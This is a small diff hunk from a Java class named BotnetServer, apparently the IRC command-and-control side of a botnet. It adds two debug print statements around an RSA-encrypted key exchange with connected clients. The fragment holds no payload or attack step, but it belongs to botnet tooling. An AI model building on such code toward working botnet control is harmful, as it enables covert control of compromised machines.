@@ -132,6 +132,8 @@ public class BotnetServer extends PircBot {
 						//use shellout for getting returned data from the client if you need it
 						//use chat.sendLine(s) to send key info
 						String key = m2.getStrKey();
+						System.out.println(key);
+						System.out.println(m.encryptRSA(key));
 						chat.sendLine(m.encryptRSA(key)); // send key
 						chat.sendLine(m.encryptRSA(info.toString())); // send public info
 						String otherKey = m.decryptMsg(chat.readLine()); // get public key
